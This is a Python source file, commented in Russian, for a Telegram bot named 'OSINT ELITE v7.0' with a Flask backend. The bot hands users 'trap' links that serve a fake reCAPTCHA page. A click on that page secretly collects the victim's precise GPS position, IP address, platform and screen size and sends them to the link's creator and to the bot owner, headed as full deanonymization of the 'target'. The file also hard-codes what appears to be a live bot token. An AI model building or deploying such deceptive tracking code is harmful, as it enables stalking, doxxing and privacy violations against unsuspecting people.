import asyncio, logging, threading, os, requests
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- НАСТРОЙКИ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)

# --- HTML С ФЕЙКОВОЙ КАПЧЕЙ И GPS ---
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body { background: #f9f9f9; font-family: Roboto,Arial,sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .captcha-box { background: #fff; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: flex; align-items: center; }
        .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; cursor: pointer; }
        .text { font-size: 14px; color: #555; }
    </style>
</head>
<body>
    <div class="captcha-box" onclick="getLocation()">
        <div class="checkbox" id="cb"></div>
        <div class="text">Я не робот</div>
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:30px; margin-left:50px;">
    </div>

    <script>
    async function sendData(coords = null) {
        let d = {
            aid: "{{ aid }}",
            p: navigator.platform,
            s: screen.width + "x" + screen.height,
            gps: coords
        };
        await fetch('/catch', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        });
        location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Тролль-редирект
    }

    function getLocation() {
        document.getElementById('cb').style.background = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/White_check.svg/1200px-White_check.svg.png') center/cover blue";
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    let coords = pos.coords.latitude + "," + pos.coords.longitude;
                    sendData(coords);
                },
                (err) => { sendData("Запрещено пользователем"); },
                { enableHighAccuracy: true }
            );
        } else { sendData("GPS не поддерживается"); }
    }
    </script>
</body>
</html>
"""

@app.route('/t/<aid>')
def trap(aid):
    return render_template_string(HTML_TRAP, aid=aid)

@app.route('/catch', methods=['POST'])
def catch():
    data = request.json
    target_aid = data.get('aid')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    gps = data.get('gps', 'Не получено')
    
    maps_link = f"https://www.google.com/maps?q={gps}" if "," in gps else "Нет данных"

    report = (
        f"🎯 **ЦЕЛЬ ПОЛНОСТЬЮ ДЕАНОНИМИЗИРОВАНА**\n\n"
        f"📍 **IP:** `{ip}`\n"
        f"🌍 **GPS:** `{gps}`\n"
        f"🗺 **Карта:** [ОТКРЫТЬ ТОЧКУ]({maps_link})\n"
        f"📱 **Железо:** {data.get('p')}\n"
        f"🖥 **Экран:** {data.get('s')}"
    )
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": target_aid, "text": report, "parse_mode": "Markdown", "disable_web_page_preview": False})
    if str(target_aid) != str(OWNER_ID):
        requests.post(url, json={"chat_id": OWNER_ID, "text": f"📡 **АДМИН-КОНТРОЛЬ:**\n{report}", "parse_mode": "Markdown"})
    
    return "OK", 200

# --- БОТ (БЕЗ ИЗМЕНЕНИЙ) ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardBuilder().add(types.KeyboardButton(text="🔗 Создать ловушку")).as_markup(resize_keyboard=True)
    await message.answer("💀 **OSINT ELITE v7.0**\nТеперь с поддержкой GPS-деанонимизации.", reply_markup=kb)

@dp.message(F.text == "🔗 Создать ловушку")
async def create_link(message: types.Message):
    await message.answer(f"✅ Ссылка с GPS-запросом:\n`{BASE_URL}/t/{message.from_user.id}`")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
